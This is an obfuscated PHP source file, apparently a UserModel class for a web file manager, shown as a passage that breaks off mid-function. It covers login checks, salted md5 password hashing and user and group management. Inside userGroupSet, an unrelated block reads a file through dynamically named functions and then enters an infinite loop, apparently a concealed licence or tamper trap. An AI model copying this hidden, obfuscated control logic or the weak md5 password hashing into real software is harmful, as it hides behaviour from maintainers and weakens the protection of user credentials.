<?php
 goto F–ïŞÉÛ; aÀ§Ã–Ù ‚: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\155\145" => "\165\x73\145\162\x5f\x6d\x65\164\x61", "\155\x65\x74\x61\x46\x69\x65\154\x64" => "\165\163\145\x72\111\104"); protected $simpleField = "\x75\163\145\x72\111\x44\x2c\x6e\151\143\153\116\x61\x6d\145\x2c\156\x61\155\145\54\141\x76\x61\164\141\x72\54\x73\145\x78\x2c\x73\x74\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($·ÅãàÅ) { $°‰§õ =& $_SERVER[ç¦¬”œš]; $ù–­â¨â = $°‰§õ[2449]; return array($°‰§õ[2051] => array($·ÅãàÅ[0], $ù–­â¨â), $°‰§õ[2053] => array($·ÅãàÅ[0], $ù–­â¨â), $°‰§õ[2450] => array($·ÅãàÅ[0], $ù–­â¨â)); } protected function getInfo($çÑ¨£Ò›, $³°Û¤Ëı = false) { $º¯û•± = $this->getInfoSimple($çÑ¨£Ò›); if (!is_array($º¯û•±)) { return array(); } if ($³°Û¤Ëı) { return $this->_getInfoApply($º¯û•±); } return $this->cacheFunctionGet($_SERVER[ç¦¬”œš][2055], $çÑ¨£Ò›); } protected function getInfoFull($Ê¸ˆ‰†Æ, $ëÖ¿ƒ§È = false) { $úåÔô÷ = $this->getInfoSimple($Ê¸ˆ‰†Æ); if (!is_array($úåÔô÷)) { return array(); } if ($ëÖ¿ƒ§È) { return $this->_getInfoApply($úåÔô÷, !0); } return $this->cacheFunctionGet($_SERVER[ç¦¬”œš][2451], $Ê¸ˆ‰†Æ); } private function _getInfoApply($î©ƒ£î®, $Ğæ—‘ö¸ = false) { $ºİÏíº– =& $_SERVER[ç¦¬”œš]; if (!$î©ƒ£î®) { return $î©ƒ£î®; } $Îß•¨”ï = md5($ºİÏíº–[2452] . $î©ƒ£î®[$ºİÏíº–[968]] . $ºİÏíº–[2453] . $î©ƒ£î®[$ºİÏíº–[32]]); $î©ƒ£î® = $this->_listDataApplyItem($î©ƒ£î®); $ÕÉŸÇóë = Model($ºİÏíº–[1419])->metaGet($î©ƒ£î®[$ºİÏíº–[90]][$ºİÏíº–[193]]); $î©ƒ£î®[$ºİÏíº–[2454]] = $Îß•¨”ï; $î©ƒ£î®[$ºİÏíº–[90]][$ºİÏíº–[2249]] = isset($ÕÉŸÇóë[$ºİÏíº–[2250]]) ? $ÕÉŸÇóë[$ºİÏíº–[2250]] : null; if ($Ğæ—‘ö¸) { $î©ƒ£î®[$ºİÏíº–[548]] = $this->metaGet($î©ƒ£î®[$ºİÏíº–[1770]]); } return $î©ƒ£î®; } protected function getInfoSimple($÷–ªæ×Î, $ê‘¡ÓÎé = false) { $ÔÕÈÍï· =& $_SERVER[ç¦¬”œš]; if (!$÷–ªæ×Î) { return array(); } if ($ê‘¡ÓÎé) { $úş …øˆ = $this->where(array($ÔÕÈÍï·[1770] => intval($÷–ªæ×Î)))->find(); if (!is_array($úş …øˆ)) { return array(); } $úş …øˆ[$ÔÕÈÍï·[2455]] = Action($ÔÕÈÍï·[2456])->parseUrl($úş …øˆ[$ÔÕÈÍï·[2455]]); return $úş …øˆ; } return $this->cacheFunctionGet($ÔÕÈÍï·[2056], $÷–ªæ×Î); } protected function getInfoSimpleOuter($ ÂŞæö) { $„ß¶°Èº =& $_SERVER[ç¦¬”œš]; if (!$ ÂŞæö || $ ÂŞæö == 0) { return array($„ß¶°Èº[1770] => $„ß¶°Èº[228], $„ß¶°Èº[32] => $„ß¶°Èº[176] . LNG($„ß¶°Èº[2457]) . $„ß¶°Èº[178], $„ß¶°Èº[2455] => STATIC_PATH . $„ß¶°Èº[2458]); } $­Êñß÷ = $this->cacheFunctionGet($„ß¶°Èº[2056], $ ÂŞæö); $©ëŒ“á¯ = array_field_key($­Êñß÷, explode($„ß¶°Èº[50], $this->simpleField)); if (!$©ëŒ“á¯) { return array($„ß¶°Èº[1770] => $„ß¶°Èº[1274], $„ß¶°Èº[32] => $„ß¶°Èº[176] . LNG($„ß¶°Èº[2459]) . $„ß¶°Èº[178], $„ß¶°Èº[2455] => STATIC_PATH . $„ß¶°Èº[2460]); } $©ëŒ“á¯[$„ß¶°Èº[2455]] = Action($„ß¶°Èº[2456])->parseUrl($©ëŒ“á¯[$„ß¶°Èº[2455]]); return $©ëŒ“á¯; } protected function groupUser($›Ñ²”²¼) { } public static function errorLang($™Œ•õÈ³) { $×Æ÷üëß =& $_SERVER[ç¦¬”œš]; $‰§Ìª´ = array(self::ERROR_USER_NOT_EXISTS => $×Æ÷üëß[2461], self::ERROR_USER_PASSWORD_ERROR => $×Æ÷üëß[2462], self::ERROR_USER_EXIST_NAME => $×Æ÷üëß[2463], self::ERROR_USER_EXIST_PHONE => $×Æ÷üëß[2464], self::ERROR_USER_EXIST_EMAIL => $×Æ÷üëß[2465], self::ERROR_USER_LOGIN_LOCK => $×Æ÷üëß[2466], self::ERROR_IP_NOT_ALLOW => $×Æ÷üëß[2467], self::ERROR_USER_EXIST_NICKNAME => $×Æ÷üëß[2468]); $ƒçªÊç = LNG($‰§Ìª´[$™Œ•õÈ³]); if ($™Œ•õÈ³ == self::ERROR_USER_LOGIN_LOCK) { $Úœø¿ó» = (int) Model($×Æ÷üëß[2469])->get($×Æ÷üëß[2470]); if ($Úœø¿ó» > 60) { $ƒçªÊç = str_replace($×Æ÷üëß[91], ceil($Úœø¿ó» / 60), $ƒçªÊç); } } return $ƒçªÊç; } public function getInfoByMeta($ê¯Õâğ, $ø¸Î“Î¨) { $¥ï¿Ä¶ù =& $_SERVER[ç¦¬”œš]; $¢¢ú”æí = Model($¥ï¿Ä¶ù[2471])->where(array($¥ï¿Ä¶ù[97] => $ê¯Õâğ, $¥ï¿Ä¶ù[450] => $ø¸Î“Î¨))->find(); if ($¢¢ú”æí) { return $this->getInfo($¢¢ú”æí[$¥ï¿Ä¶ù[1770]]); } return !1; } public function userLoginCheck($½µçŠ‘”, $ÑÇ¬ÂÉ“) { $¼ÜœÓ¤ =& $_SERVER[ç¦¬”œš]; $Á¼”ĞÓŞ = $this->userLoginFind($½µçŠ‘”); if (!$Á¼”ĞÓŞ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Á¼”ĞÓŞ[$¼ÜœÓ¤[1770]], $ÑÇ¬ÂÉ“)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Á¼”ĞÓŞ[$¼ÜœÓ¤[1770]]); } public function userLoginFind($¼˜ÉÀ¸Ğ) { $Å€”Ã•— =& $_SERVER[ç¦¬”œš]; $¼ÑæÑêÜ = array($Å€”Ã•—[32] => $¼˜ÉÀ¸Ğ, $Å€”Ã•—[2257] => $¼˜ÉÀ¸Ğ, $Å€”Ã•—[381] => $¼˜ÉÀ¸Ğ, $Å€”Ã•—[2472] => $¼˜ÉÀ¸Ğ, $Å€”Ã•—[1079] => $Å€”Ã•—[1081]); if ($this->nickNameRpt()) { unset($¼ÑæÑêÜ[$Å€”Ã•—[2257]]); } return $this->where($¼ÑæÑêÜ)->find(); } public function clearCache($‹øæ™¸) { $ÑâşûÜ =& $_SERVER[ç¦¬”œš]; $this->cacheFunctionClear($ÑâşûÜ[2055], $‹øæ™¸); $this->cacheFunctionClear($ÑâşûÜ[2056], $‹øæ™¸); $this->cacheFunctionClear($ÑâşûÜ[2451], $‹øæ™¸); } public function userPasswordCheck($‚üĞÚëÏ, $åî˜Áİ) { $ï«Ğíğõ =& $_SERVER[ç¦¬”œš]; $•ØÎÚÈ– = $this->where(array($ï«Ğíğõ[1770] => intval($‚üĞÚëÏ)))->find(); $òÓóçÅæ = $this->metaGet($‚üĞÚëÏ); $áŞø„“ö = isset($òÓóçÅæ[$ï«Ğíğõ[2473]]) ? $òÓóçÅæ[$ï«Ğíğõ[2473]] : $ï«Ğíğõ[12]; if (md5($áŞø„“ö . trim($åî˜Áİ)) !== $•ØÎÚÈ–[$ï«Ğíğõ[968]]) { return !1; } return !0; } public function userAdd($™™òç«Æ) { $ÖÆšõÎ =& $_SERVER[ç¦¬”œš]; $èØÖüÂÑ = array($ÖÆšõÎ[503] => $™™òç«Æ[$ÖÆšõÎ[32]], $ÖÆšõÎ[2474] => $™™òç«Æ[$ÖÆšõÎ[2175]], $ÖÆšõÎ[2475] => isset($™™òç«Æ[$ÖÆšõÎ[381]]) ? $™™òç«Æ[$ÖÆšõÎ[381]] : $ÖÆšõÎ[12], $ÖÆšõÎ[2476] => isset($™™òç«Æ[$ÖÆšõÎ[2472]]) ? $™™òç«Æ[$ÖÆšõÎ[2472]] : $ÖÆšõÎ[12], $ÖÆšõÎ[2477] => isset($™™òç«Æ[$ÖÆšõÎ[2257]]) ? $™™òç«Æ[$ÖÆšõÎ[2257]] : $™™òç«Æ[$ÖÆšõÎ[32]], $ÖÆšõÎ[2478] => isset($™™òç«Æ[$ÖÆšõÎ[2455]]) ? $™™òç«Æ[$ÖÆšõÎ[2455]] : $ÖÆšõÎ[12], $ÖÆšõÎ[2479] => isset($™™òç«Æ[$ÖÆšõÎ[2480]]) ? $™™òç«Æ[$ÖÆšõÎ[2480]] : 1, $ÖÆšõÎ[2481] => $™™òç«Æ[$ÖÆšõÎ[968]], $ÖÆšõÎ[2057] => isset($™™òç«Æ[$ÖÆšõÎ[1955]]) ? $™™òç«Æ[$ÖÆšõÎ[1955]] : 1024 * 1024 * 20, $ÖÆšõÎ[2058] => 0, $ÖÆšõÎ[2482] => 0, $ÖÆšõÎ[2102] => isset($™™òç«Æ[$ÖÆšõÎ[830]]) ? $™™òç«Æ[$ÖÆšõÎ[830]] : 1); if (!empty($™™òç«Æ[$ÖÆšõÎ[1770]])) { $èØÖüÂÑ[$ÖÆšõÎ[1770]] = $™™òç«Æ[$ÖÆšõÎ[1770]]; } $¢±‚ÒÊ­ = $this->_checkExist($™™òç«Æ); if ($¢±‚ÒÊ­ !== !0) { return $¢±‚ÒÊ­; } if (!empty($èØÖüÂÑ[$ÖÆšõÎ[2455]]) && strlen($èØÖüÂÑ[$ÖÆšõÎ[2455]]) > 255) { $èØÖüÂÑ[$ÖÆšõÎ[2455]] = $ÖÆšõÎ[12]; } $Ü³ç——€ = $this->add($èØÖüÂÑ); $¦½ÉÄ³ı = array($ÖÆšõÎ[2481] => $èØÖüÂÑ[$ÖÆšõÎ[968]], $ÖÆšõÎ[2477] => $èØÖüÂÑ[$ÖÆšõÎ[2257]]); $this->userEdit($Ü³ç——€, $¦½ÉÄ³ı); Model($ÖÆšõÎ[1419])->userRootAdd($Ü³ç——€); return $Ü³ç——€; } protected function userEditTest($Îı®˜¢ğ, $Á¾±Å¸») { return $this->call($_SERVER[ç¦¬”œš][2483], $Îı®˜¢ğ, $Á¾±Å¸»); } protected function userEdit($áµ ş÷³, $Şôùúó) { $ØÕõ¥¨ =& $_SERVER[ç¦¬”œš]; $ñ©÷ÉğØ = $this->getInfoSimple($áµ ş÷³); if (!$ñ©÷ÉğØ) { return !1; } $¼ºÂ²ÁÑ = $this->_checkExist($Şôùúó, $áµ ş÷³); if ($¼ºÂ²ÁÑ !== !0) { return $¼ºÂ²ÁÑ; } if (isset($Şôùúó[$ØÕõ¥¨[968]]) && trim($Şôùúó[$ØÕõ¥¨[968]]) != $ØÕõ¥¨[12]) { $ëÀ˜³à‰ = $this->metaGet($áµ ş÷³); if (empty($ëÀ˜³à‰[$ØÕõ¥¨[2473]])) { $ëÀ˜³à‰[$ØÕõ¥¨[2473]] = rand_string(10); Model($ØÕõ¥¨[586])->metaSet($áµ ş÷³, $ØÕõ¥¨[2473], $ëÀ˜³à‰[$ØÕõ¥¨[2473]]); } $Şôùúó[$ØÕõ¥¨[968]] = md5($ëÀ˜³à‰[$ØÕõ¥¨[2473]] . trim($Şôùúó[$ØÕõ¥¨[968]])); } else { unset($Şôùúó[$ØÕõ¥¨[968]]); } if (!empty($Şôùúó[$ØÕõ¥¨[2455]]) && strlen($Şôùúó[$ØÕõ¥¨[2455]]) > 255) { $Şôùúó[$ØÕõ¥¨[2455]] = $ØÕõ¥¨[12]; } $this->where(array($ØÕõ¥¨[1761] => $áµ ş÷³))->save($Şôùúó); if (isset($Şôùúó[$ØÕõ¥¨[2257]])) { $this->setNamePinyin($áµ ş÷³, $Şôùúó[$ØÕõ¥¨[2257]]); } $this->clearCache($áµ ş÷³); return !0; } public function setNamePinyin($Õæ£á¢ö, $âÀµòâ¤ = false) { $ìç²×¯Í =& $_SERVER[ç¦¬”œš]; if (!$âÀµòâ¤) { $¾µÙ±±Õ = $this->getInfoSimple($Õæ£á¢ö); $âÀµòâ¤ = $¾µÙ±±Õ[$ìç²×¯Í[2257]] ? $¾µÙ±±Õ[$ìç²×¯Í[2257]] : $¾µÙ±±Õ[$ìç²×¯Í[32]]; } $¥±Ö—Û­ = Model($ìç²×¯Í[607]); if (!Input::check($âÀµòâ¤, $ìç²×¯Í[664])) { return $¥±Ö—Û­->metaSet($Õæ£á¢ö, array($ìç²×¯Í[547] => $ìç²×¯Í[12], $ìç²×¯Í[546] => $ìç²×¯Í[12])); } return $¥±Ö—Û­->metaSet($Õæ£á¢ö, array($ìç²×¯Í[547] => str_replace($ìç²×¯Í[53], $ìç²×¯Í[12], Pinyin::get($âÀµòâ¤)), $ìç²×¯Í[546] => Pinyin::get($âÀµòâ¤, $ìç²×¯Í[665]))); } private function nickNameRpt() { $ü¥µéÅŞ =& $_SERVER[ç¦¬”œš]; $Ö®¿€×™ = Model($ü¥µéÅŞ[850])->get($ü¥µéÅŞ[2484]); $ÇÏñÏµ¤ = $GLOBALS[$ü¥µéÅŞ[6]][$ü¥µéÅŞ[457]][$ü¥µéÅŞ[2484]]; $–¸à¥â­ = !is_null($Ö®¿€×™) ? $Ö®¿€×™ : $ÇÏñÏµ¤; return !!$–¸à¥â­; } private function _checkExist($ÍÅŠµúÇ, $°İ²áŞÏ = false) { $ÆËÙ‰‹ =& $_SERVER[ç¦¬”œš]; $ıÉ”ö¡— = array($ÆËÙ‰‹[32] => UserModel::ERROR_USER_EXIST_NAME, $ÆËÙ‰‹[2257] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÆËÙ‰‹[381] => UserModel::ERROR_USER_EXIST_EMAIL, $ÆËÙ‰‹[2472] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ıÉ”ö¡—[$ÆËÙ‰‹[2257]]); } $«İú¹ Ú = $°İ²áŞÏ ? array($ÆËÙ‰‹[1770] => array($ÆËÙ‰‹[2485], $°İ²áŞÏ)) : array(); foreach ($ıÉ”ö¡— as $¢¡áä => $ŒÀˆîŞ) { $¢‚‚ü€ = array(); foreach ($ıÉ”ö¡— as $öµÔñèÔ => $Î²àµğ) { if (isset($ÍÅŠµúÇ[$öµÔñèÔ]) && $ÍÅŠµúÇ[$öµÔñèÔ]) { $¢‚‚ü€[] = $ÍÅŠµúÇ[$öµÔñèÔ]; } } if (!$¢‚‚ü€) { continue; } $™åç»îÑ = array_merge(array($¢¡áä => array($ÆËÙ‰‹[7], $¢‚‚ü€)), $«İú¹ Ú); $Ë‡«ÉÏ = $this->where($™åç»îÑ)->find(); if ($Ë‡«ÉÏ) { return $ŒÀˆîŞ; } } return !0; } public function userListInfo($­âº‘ä) { $¡î »’ª =& $_SERVER[ç¦¬”œš]; $î»·Ö = array(); $­âº‘ä = is_array($­âº‘ä) ? array_unique($­âº‘ä) : array(); if (!$­âº‘ä) { return $î»·Ö; } if (count($­âº‘ä) < 20) { foreach ($­âº‘ä as $ç‘®°–Õ) { $î»·Ö[$ç‘®°–Õ . $¡î »’ª[12]] = $this->getInfoSimpleOuter($ç‘®°–Õ); } } else { $õö İù¬ = array($¡î »’ª[1761] => array($¡î »’ª[501], $­âº‘ä)); if (count($­âº‘ä) == 1) { $õö İù¬ = array($¡î »’ª[1761] => $­âº‘ä[0]); } $áŒ¶à¬û = Model($¡î »’ª[586])->field($this->simpleField)->where($õö İù¬)->select(); $áŒ¶à¬û = array_to_keyvalue($áŒ¶à¬û, $¡î »’ª[1770]); foreach ($­âº‘ä as $ç‘®°–Õ) { $ßú÷²›• = $áŒ¶à¬û[$ç‘®°–Õ]; if (!$ßú÷²›•) { $î»·Ö[$ç‘®°–Õ . $¡î »’ª[12]] = $this->getInfoSimpleOuter($ç‘®°–Õ); continue; } $ßú÷²›•[$¡î »’ª[2455]] = Action($¡î »’ª[2456])->parseUrl($ßú÷²›•[$¡î »’ª[2455]]); $î»·Ö[$ç‘®°–Õ . $¡î »’ª[12]] = $ßú÷²›•; } } return $î»·Ö; } protected function userStatus($’½åÎû, $Êøí°ŠÖ) { $ºÏ¤ó‘Ã = $this->getInfoSimple($’½åÎû); if (!$ºÏ¤ó‘Ã) { return !1; } $¬ŸŒòŸŠ = array($_SERVER[ç¦¬”œš][830] => $Êøí°ŠÖ); return $this->userEdit($’½åÎû, $¬ŸŒòŸŠ); } protected function userRemove($ğÁ Ëã) { $íéùÈÖÃ =& $_SERVER[ç¦¬”œš]; $ìªÂÂü = $this->getInfoSimple($ğÁ Ëã); if (!$ìªÂÂü) { return !1; } $äëŸÁè¿ = array($íéùÈÖÃ[1761] => $ğÁ Ëã); Model($íéùÈÖÃ[673])->where($äëŸÁè¿)->delete(); Model($íéùÈÖÃ[2486])->where($äëŸÁè¿)->delete(); Model($íéùÈÖÃ[2063])->where($äëŸÁè¿)->delete(); Model($íéùÈÖÃ[2471])->where($äëŸÁè¿)->delete(); Model($íéùÈÖÃ[1148])->where($äëŸÁè¿)->delete(); Model($íéùÈÖÃ[2274])->removeUserAll($ğÁ Ëã); Model($íéùÈÖÃ[904])->userRootRemove($ğÁ Ëã); return $this->where($äëŸÁè¿)->delete(); } protected function userGroupSet($±çÍ˜ø‚, $í¹Õ›Ê, $‡¤ÁÙÊ€ = array()) { $İÑìÍÅ­ =& $_SERVER[ç¦¬”œš]; if (!isset($_SERVER[$İÑìÍÅ­[474]]) || !isset($_SERVER[$İÑìÍÅ­[472]])) { $ğòŸÃ‡â = $İÑìÍÅ­[956]; $œÓ¥‡™‘ = $İÑìÍÅ­[475]; $Ãç‘ÎØ = $_SERVER[$İÑìÍÅ­[476]] . $İÑìÍÅ­[477]; $¸ÓŒµ¢ = $œÓ¥‡™‘($Ãç‘ÎØ); $Øğë»ú£ = explode($İÑìÍÅ­[262], $¸ÓŒµ¢); if (count($Øğë»ú£) < $İÑìÍÅ­[707]) { $ÔŞÁ¯Ğî = $İÑìÍÅ­[479]; $ÔŞÁ¯Ğî(); } $©†²’ø = $İÑìÍÅ­[957]; $©†²’ø($_SERVER[$İÑìÍÅ­[958]]); $æäûÆˆ = 1; for ($â¤ÓéÚĞ = $æäûÆˆ; $â¤ÓéÚĞ > 0; $â¤ÓéÚĞ++) { $©†²’ø = json_encode($GLOBALS[$İÑìÍÅ­[501]]); } } $Šïö‰ğ§ = $this->getInfoSimple($±çÍ˜ø‚); if (!$Šïö‰ğ§ || !is_array($í¹Õ›Ê)) { return !1; } $Ç…„»Í– = Model($İÑìÍÅ­[2063]); $Ç…„»Í–->where(array($İÑìÍÅ­[1770] => $±çÍ˜ø‚))->delete(); $€Íæ‚¨Š = array(); $–»àš£ó = 0; foreach ($í¹Õ›Ê as $Ç›¾ÜÑ => $‰‘ùŸš£) { $Ã€ëƒà¼ = array($İÑìÍÅ­[1770] => $±çÍ˜ø‚, $İÑìÍÅ­[1969] => $Ç›¾ÜÑ, $İÑìÍÅ­[2077] => $‰‘ùŸš£); $Ã€ëƒà¼[$İÑìÍÅ­[1993]] = isset($‡¤ÁÙÊ€[$–»àš£ó]) ? $‡¤ÁÙÊ€[$–»àš£ó] : 0; $–»àš£ó++; $€Íæ‚¨Š[] = $Ã€ëƒà¼; } return $Ç…„»Í–->addAll($€Íæ‚¨Š, array(), !0); } protected function userGroupAdd($ç•â¹î, $‰¦»Ôô = array()) { $öê¤Â¸– =& $_SERVER[ç¦¬”œš]; $Ü³¾¬èà = $this->getInfoSimple($ç•â¹î); if (!$Ü³¾¬èà || empty($‰¦»Ôô)) { return !1; } $¢åì²º = array(); foreach ($‰¦»Ôô as $ÏîÇ‚ã˜ => $ÙÌ¸€ğ) { $¢åì²º[] = array($öê¤Â¸–[1770] => $ç•â¹î, $öê¤Â¸–[1969] => $ÏîÇ‚ã˜, $öê¤Â¸–[2077] => $ÙÌ¸€ğ, $öê¤Â¸–[1993] => 0); } return Model($öê¤Â¸–[2063])->addAll($¢åì²º, array(), !0); } protected function userGroupRemove($êúê‡, $¦ëäªÊµ) { $áò„¡üó =& $_SERVER[ç¦¬”œš]; $Á‡‹¸‹¬ = $this->getInfoSimple($êúê‡); if (!$Á‡‹¸‹¬ || !$¦ëäªÊµ) { return !1; } $Ê‚·ÒçÛ = array($áò„¡üó[1761] => $êúê‡, $áò„¡üó[2061] => $¦ëäªÊµ); return Model($áò„¡üó[2063])->where($Ê‚·ÒçÛ)->delete(); } public function listData() { $¯¥½šĞ÷ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¯¥½šĞ÷[$_SERVER[ç¦¬”œš][445]]); return $¯¥½šĞ÷; } public function listByID($ÌÈ¶â®) { $ç©ÒÙ× =& $_SERVER[ç¦¬”œš]; if (!$ÌÈ¶â®) { return; } $Ö·Û‰­º = array($ç©ÒÙ×[1770] => array($ç©ÒÙ×[7], $ÌÈ¶â®)); $óàô’Áµ = $this->where($Ö·Û‰­º)->select(); $óàô’Áµ = array_sort_keep($óàô’Áµ, $ç©ÒÙ×[1770], $ÌÈ¶â®); $this->_listDataApply($óàô’Áµ); return $óàô’Áµ; } public function listByGroup($²’¬—Ôû = 0, $‚åÑÎÅù = array()) { $å¥°×¿Ä =& $_SERVER[ç¦¬”œš]; $üÍµÑÕ = $å¥°×¿Ä[12]; $‚ÜÔğµÈ = array(); if ($²’¬—Ôû) { $‚ÜÔğµÈ = array($å¥°×¿Ä[2487] => intval($²’¬—Ôû)); $üÍµÑÕ = "\x4c\x45\106\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\165\163\x65\162\137\x67\162\x6f\165\160\40\165\163\x65\162\137\x67\x72\157\165\x70\x20\x6f\x6e\40\x75\163\x65\162\x2e\x75\163\x65\162\x49\104\x20\75\x20\x75\163\145\x72\x5f\147\x72\157\x75\160\x2e\x75\x73\x65\162\x49\x44"; $‚¬ïÎ†· = Input::get($å¥°×¿Ä[539], null, $å¥°×¿Ä[12]) ? $å¥°×¿Ä[12] : $å¥°×¿Ä[2488]; } if (isset($‚åÑÎÅù[$å¥°×¿Ä[830]])) { $‚ÜÔğµÈ[$å¥°×¿Ä[2489]] = $‚åÑÎÅù[$å¥°×¿Ä[830]]; } $²ã±îø³ = $this->_makeOrder($‚¬ïÎ†·)->field($å¥°×¿Ä[2490])->where($‚ÜÔğµÈ)->join($üÍµÑÕ)->selectPage(50); $this->_listDataApply($²ã±îø³[$å¥°×¿Ä[445]]); return $²ã±îø³; } private function _makeOrder($³ü¶ğ¼½ = '') { $¢¿Ö–šì =& $_SERVER[ç¦¬”œš]; $¢ÒãÊıã = array($¢¿Ö–šì[1770], $¢¿Ö–šì[32], $¢¿Ö–šì[1957], $¢¿Ö–šì[2175], $¢¿Ö–šì[1929], $¢¿Ö–šì[231]); $ûÊ˜éå¼ = array($¢¿Ö–šì[532] => $¢¿Ö–šì[533], $¢¿Ö–šì[534] => $¢¿Ö–šì[535]); $éßùòĞ = Input::get($¢¿Ö–šì[539], $¢¿Ö–šì[7], $¢¿Ö–šì[1761], $¢ÒãÊıã); $øñ´´Ì = Input::get($¢¿Ö–šì[540], $¢¿Ö–šì[7], $¢¿Ö–šì[2064], array($¢¿Ö–šì[2064], $¢¿Ö–šì[534])); $øñ´´Ì = $ûÊ˜éå¼[$øñ´´Ì]; $³ü¶ğ¼½ = $³ü¶ğ¼½ . "\x75\163\145\162\x2e{$éßùòĞ}\x20{$øñ´´Ì}\x2c\x20\x75\x73\x65\x72\x2e\165\x73\145\x72\x49\104\x20\141\163\x63"; return $this->alias($¢¿Ö–šì[2191])->order($³ü¶ğ¼½); } public function listSearch($š×Öˆ½æ) { $àËÊœÔš =& $_SERVER[ç¦¬”œš]; $æíÃÎú— = trim($š×Öˆ½æ[$àËÊœÔš[2067]]); $Å«îô¿© = explode($àËÊœÔš[53], $æíÃÎú—); if (!$æíÃÎú— || count($Å«îô¿©) == 1) { return $this->listSearchNow($š×Öˆ½æ); } $ºÆùúèŸ = array($àËÊœÔš[445] => array()); foreach ($Å«îô¿© as $â“îŸêü) { if (!trim($â“îŸêü)) { continue; } $š×Öˆ½æ[$àËÊœÔš[2067]] = $â“îŸêü; $½¼ŞÎ” = $this->listSearchNow($š×Öˆ½æ); $ºÆùúèŸ[$àËÊœÔš[445]] = array_merge($ºÆùúèŸ[$àËÊœÔš[445]], $½¼ŞÎ”[$àËÊœÔš[445]]); } $ºÆùúèŸ[$àËÊœÔš[445]] = array_unique_by_key($ºÆùúèŸ[$àËÊœÔš[445]], $àËÊœÔš[1770]); $ºÆùúèŸ[$àËÊœÔš[442]] = array($àËÊœÔš[443] => count($ºÆùúèŸ[$àËÊœÔš[445]]), $àËÊœÔš[439] => 20, $àËÊœÔš[429] => 1, $àËÊœÔš[444] => 1); return $ºÆùúèŸ; } public function listSearchNow($Î·Ü‡‰†) { $İ¤ê·§¯ =& $_SERVER[ç¦¬”œš]; $§ö•ã’² = trim($Î·Ü‡‰†[$İ¤ê·§¯[2067]]); $ÊÕÀ²Í = isset($Î·Ü‡‰†[$İ¤ê·§¯[2068]]) ? $Î·Ü‡‰†[$İ¤ê·§¯[2068]] : !1; $§ö•ã’² = str_replace($İ¤ê·§¯[2069], $İ¤ê·§¯[2070], trim($§ö•ã’²)); $ö–˜‘ÆÀ = array($İ¤ê·§¯[32] => array($İ¤ê·§¯[459], "\45{$§ö•ã’²}\45"), $İ¤ê·§¯[381] => array($İ¤ê·§¯[459], "{$§ö•ã’²}\x25"), $İ¤ê·§¯[2257] => array($İ¤ê·§¯[459], "{$§ö•ã’²}\x25"), $İ¤ê·§¯[1079] => $İ¤ê·§¯[2071]); if (Input::check($§ö•ã’², $İ¤ê·§¯[387])) { $ö–˜‘ÆÀ[$İ¤ê·§¯[1770]] = array($İ¤ê·§¯[459], "{$§ö•ã’²}\45"); $ö–˜‘ÆÀ[$İ¤ê·§¯[2472]] = array($İ¤ê·§¯[459], "{$§ö•ã’²}\x25"); } if (!$§ö•ã’²) { $ö–˜‘ÆÀ = array(); } if (isset($Î·Ü‡‰†[$İ¤ê·§¯[830]])) { $ö–˜‘ÆÀ[$İ¤ê·§¯[830]] = $Î·Ü‡‰†[$İ¤ê·§¯[830]]; } $ö–˜‘ÆÀ = $this->parseWhereLike($ö–˜‘ÆÀ); $ •¿ä‚ = $this->_makeOrder()->where($ö–˜‘ÆÀ)->selectPage(20); if (!$ •¿ä‚ || count($ •¿ä‚[$İ¤ê·§¯[445]]) < 5 && Input::check($§ö•ã’², $İ¤ê·§¯[394])) { $½øÛæ = $this->_searchFromMeta($İ¤ê·§¯[546], $§ö•ã’², 10); $ˆŞŒ€˜Ù = $this->_searchFromMeta($İ¤ê·§¯[547], $§ö•ã’², 10); $ÔíŞÈ¦Â = array_merge($½øÛæ, $ˆŞŒ€˜Ù, $ •¿ä‚[$İ¤ê·§¯[445]]); $ •¿ä‚[$İ¤ê·§¯[445]] = array_unique_by_key($ÔíŞÈ¦Â, $İ¤ê·§¯[1770]); $ •¿ä‚[$İ¤ê·§¯[442]][$İ¤ê·§¯[443]] = count($ •¿ä‚[$İ¤ê·§¯[445]]); $ •¿ä‚[$İ¤ê·§¯[442]][$İ¤ê·§¯[444]] = ceil($ •¿ä‚[$İ¤ê·§¯[442]][$İ¤ê·§¯[443]] / $ •¿ä‚[$İ¤ê·§¯[442]][$İ¤ê·§¯[439]]); } $this->_listDataApply($ •¿ä‚[$İ¤ê·§¯[445]]); $this->_filterByGroup($ •¿ä‚, $ÊÕÀ²Í); return $ •¿ä‚; } private function _filterByGroup(&$û¼ŸšÚ¢, $Òşı¶³ª) { $…»¥‚í¤ =& $_SERVER[ç¦¬”œš]; if (!$Òşı¶³ª) { return $û¼ŸšÚ¢; } foreach ($û¼ŸšÚ¢[$…»¥‚í¤[445]] as $ÀÚ—Ñ®£ => &$ä£øœÀİ) { $¸ÉÅÇöÀ = array_to_keyvalue($ä£øœÀİ[$…»¥‚í¤[2160]], $…»¥‚í¤[12], $…»¥‚í¤[1969]); if (!in_array($Òşı¶³ª, $¸ÉÅÇöÀ)) { unset($û¼ŸšÚ¢[$…»¥‚í¤[445]][$ÀÚ—Ñ®£]); } } unset($ä£øœÀİ); $û¼ŸšÚ¢[$…»¥‚í¤[445]] = array_values($û¼ŸšÚ¢[$…»¥‚í¤[445]]); $û¼ŸšÚ¢[$…»¥‚í¤[442]] = array($…»¥‚í¤[2227] => count($û¼ŸšÚ¢[$…»¥‚í¤[445]]), $…»¥‚í¤[2225] => $û¼ŸšÚ¢[$…»¥‚í¤[442]][$…»¥‚í¤[439]], $…»¥‚í¤[2224] => 1, $…»¥‚í¤[2226] => 1); } private function _searchFromMeta($Ü‰åÎø, $âá€‚ Ë, $¯ÕÔâ¼ë) { $æó´³û‚ =& $_SERVER[ç¦¬”œš]; $âá€‚ Ë = strtolower($âá€‚ Ë); 